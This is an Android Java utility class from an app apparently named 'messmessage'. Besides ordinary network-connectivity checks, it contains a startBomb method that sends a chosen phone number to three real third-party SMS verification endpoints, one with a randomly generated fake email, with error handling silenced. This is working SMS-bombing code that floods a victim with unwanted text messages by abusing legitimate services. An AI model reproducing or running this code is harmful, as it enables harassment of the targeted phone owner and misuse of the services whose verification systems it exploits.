package com.itant.messmessage.tool;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.widget.Toast;

import org.xutils.common.Callback;
import org.xutils.http.RequestParams;
import org.xutils.x;

import java.util.Random;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by 詹子聪 on 2016/8/12.
 */
public class NetTool {
    /**
     * 判断是否有网络
     *
     * @param context 上下文
     * @return true:表示有网络 false:表示没有网络
     */
    public static boolean isNetworkConnected(Context context) {
        boolean isNetAvailable = false;
        if (context != null) {
            ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();
            if (mNetworkInfo != null) {
                isNetAvailable = mNetworkInfo.isAvailable();
            }
        }

        if (!isNetAvailable) {
            Toast.makeText(context, "请检查网络", Toast.LENGTH_SHORT).show();
        }
        return isNetAvailable;
    }

    /**
     * 判断是否已经连接上WiFi
     *
     * @param context 上下文
     * @return true:表示已连接WiFi false:表示没有连接WiFi
     */
    public static boolean isWiFiConnected(Context context) {
        if (context != null) {
            ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();
            if (mNetworkInfo != null) {
                return (mNetworkInfo.getType() == ConnectivityManager.TYPE_WIFI);
            }
        }
        return false;
    }

    /**
     * 判断是否连接了移动网络
     *
     * @param context 上下文
     * @return true:表示连接了移动网络 false:表示没有连接移动网络
     */
    public static boolean isMobileConnected(Context context) {
        if (context != null) {
            ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();
            if (mNetworkInfo != null) {
                return (mNetworkInfo.getType() == ConnectivityManager.TYPE_MOBILE);
            }
        }
        return false;
    }

    private static Random random = new Random();
    public static void startBomb(String phone) {
        RequestParams params = new RequestParams("http://user.u009.com/index/sendsms");
        params.addBodyParameter("phone", phone);
        x.http().post(params, new Callback.CommonCallback<String>() {
            @Override
            public void onSuccess(String result) {
                //Toast.makeText(x.app(), result, Toast.LENGTH_LONG).show();
            }

            @Override
            public void onError(Throwable ex, boolean isOnCallback) {
                //Toast.makeText(x.app(), ex.getMessage(), Toast.LENGTH_LONG).show();
            }

            @Override
            public void onCancelled(CancelledException cex) {
                //Toast.makeText(x.app(), "cancelled", Toast.LENGTH_LONG).show();
            }

            @Override
            public void onFinished() {

            }
        });

        RequestParams params1 = new RequestParams("http://www.miaodiyun.com/reg/get-phone-code");
        params1.addBodyParameter("phone", phone);
        params1.addBodyParameter("email", (random.nextInt(1222222222) + 8888) + "@qq.com");
        params1.addBodyParameter("t", "0");
        x.http().post(params1, new Callback.CommonCallback<String>() {
            @Override
            public void onSuccess(String result) {
                //Toast.makeText(x.app(), result, Toast.LENGTH_LONG).show();
            }

            @Override
            public void onError(Throwable ex, boolean isOnCallback) {
                //Toast.makeText(x.app(), ex.getMessage(), Toast.LENGTH_LONG).show();
            }

            @Override
            public void onCancelled(CancelledException cex) {
                //Toast.makeText(x.app(), "cancelled", Toast.LENGTH_LONG).show();
            }

            @Override
            public void onFinished() {

            }
        });

        RequestParams params2 = new RequestParams("http://passport.2345.com/webapi/phone/");
        params2.addQueryStringParameter("phone", phone);
        params2.addQueryStringParameter("mid", "SJLM");
        x.http().get(params2, new Callback.CommonCallback<String>() {
            @Override
            public void onSuccess(String result) {
                //Toast.makeText(x.app(), result, Toast.LENGTH_LONG).show();
            }

            @Override
            public void onError(Throwable ex, boolean isOnCallback) {
                //Toast.makeText(x.app(), ex.getMessage(), Toast.LENGTH_LONG).show();
            }

            @Override
            public void onCancelled(CancelledException cex) {
                //Toast.makeText(x.app(), "cancelled", Toast.LENGTH_LONG).show();
            }

            @Override
            public void onFinished() {

            }
        });
    }
}
